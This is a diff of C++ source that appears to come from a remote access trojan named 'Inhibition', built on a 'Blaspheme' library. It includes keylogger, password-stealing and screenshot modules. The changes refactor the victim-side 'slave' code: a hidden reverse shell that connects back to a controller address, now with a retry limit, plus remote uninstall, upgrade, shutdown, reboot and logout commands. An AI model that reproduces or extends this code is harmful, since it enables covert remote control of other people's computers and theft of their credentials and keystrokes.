@@ -3,28 +3,26 @@
 
 #include <string>
 #include <fstream>
-#include <sstream>
 using namespace std;
 
-#include "system/Process.hpp"
-#include "system/File.hpp"
+#include <system/System.hpp>
+#include <system/Process.hpp>
+#include <system/File.hpp>
 using namespace System;
 
 #include <blaspheme/transfer/FileTransfer.hpp>
 #include <blaspheme/Blaspheme.hpp>
 using namespace Blaspheme;
-using namespace Network;
 
-#include "RemoteControlFunctions.hpp"
-#include "InhibitionCore.hpp"
-#include "ServerAbstractFunction.hpp"
-#include "ProgramStart.hpp"
 #include <malicious/Screenshot.hpp>
 #include <malicious/Keylogger.hpp>
 #include <malicious/Passwords.hpp>
-#include <common/Log.hpp>
-#include <system/System.hpp>
 using namespace Malicious;
+
+#include "RemoteControlFunctions.hpp"
+#include "SlaveCore.hpp"
+#include "SlaveAbstractFunction.hpp"
+#include "ProgramStart.hpp"
 
 #define SCREENSHOT_FILENAME "capture.jpg"
 
@@ -43,9 +41,9 @@ namespace Inhibition
         si.wShowWindow = SW_HIDE;
         si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
 
-		LOG << "Reverse Shell on " + cinfo.ip + ":" + toString(cinfo.port);
-        sAddr.sin_addr.s_addr = inet_addr(cinfo.ip.c_str());
-        sAddr.sin_port =  htons(cinfo.port);
+		LOG << "Reverse Shell on " + slave().getConnection().ip + ":" + toString(slave().getConnection().port);
+        sAddr.sin_addr.s_addr = inet_addr(slave().getConnection().ip.c_str());
+        sAddr.sin_port =  htons(slave().getConnection().port);
         sAddr.sin_family = AF_INET;
 
         SOCKET c = WSASocket( AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0 );
@@ -54,9 +52,17 @@ namespace Inhibition
 			LOG << "Unable to open socket for RemoteShell.";
 			return;
 		}
+
+		int retry = 5;
         while(connect(c, (LPSOCKADDR)&sAddr, sizeof(sAddr)))
         {
+			if(!retry)
+			{
+				closesocket( c );
+				return;
+			}
             LOG << "Connection failed";
+			retry--;
             Sleep(100);
         }
 		
@@ -171,21 +177,21 @@ namespace Inhibition
     void UninstallClient::operator()()
     {
         LOG << "Uninstall : Started";
-        InhibitionCore::instance().uninstall();
+        slave().uninstall();
         LOG << "Uninstall : Finished";
     }
 
     void KillClient::operator()()
     {
         LOG << "KillServer : Started";
-        InhibitionCore::instance().exit();
+        slave().exit();
         LOG << "KillServer : Finished";
     }
 
     void UpgradeClient::operator()()
     {
         LOG << "UpdateServer : Started";
-        InhibitionCore::instance().upgrade();
+        slave().upgrade();
         LOG << "UpdateServer : Finished";
     }
 
@@ -198,7 +204,7 @@ namespace Inhibition
         ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI;
         ShExecInfo.hwnd = NULL;
         ShExecInfo.lpVerb = NULL;
-        ShExecInfo.lpFile = InhibitionCore::instance().getInstallPath().c_str();
+        ShExecInfo.lpFile = slave().getInstallPath().c_str();
         ShExecInfo.lpParameters = NULL;
         ShExecInfo.lpDirectory = NULL;
         ShExecInfo.nShow = SW_SHOW;
@@ -206,12 +212,12 @@ namespace Inhibition
 
         if(!ShellExecuteEx(&ShExecInfo))
         {
-            LOG << "Unable to launch " << InhibitionCore::instance().getInstallPath();
+            LOG << "Unable to launch " << slave().getInstallPath();
         }
         else
         {
             LOG << "RebootInhibition : Finished";
-            InhibitionCore::instance().exit();
+            slave().exit();
         }
         LOG << "RebootInhibition : Ended";
     }
@@ -339,7 +345,7 @@ namespace Inhibition
     void SendClientName::operator()()
     {
         LOG << "SendClientName : Started";
-        session() << cinfo.name;
+        session() << slave().getConnection().name;
         LOG << "SendClientName : Finished";
     }
 
@@ -347,21 +353,21 @@ namespace Inhibition
     {
         LOG << "Shutting down";
         System::shutdown();
-        InhibitionCore::instance().exit();
+        slave().exit();
     }
 
     void Reboot::operator()()
     {
         LOG << "Rebooting";
         System::reboot();
-        InhibitionCore::instance().exit();
+        slave().exit();
     }
 
     void Logout::operator()()
     {
         LOG << "Logout";
         System::logout();
-        InhibitionCore::instance().exit();
+        slave().exit();
     }
 
     void Hibernate::operator()()
@@ -370,4 +376,4 @@ namespace Inhibition
         System::hibernate();
     }
 
-} /* Inhibition */
+} // Inhibition
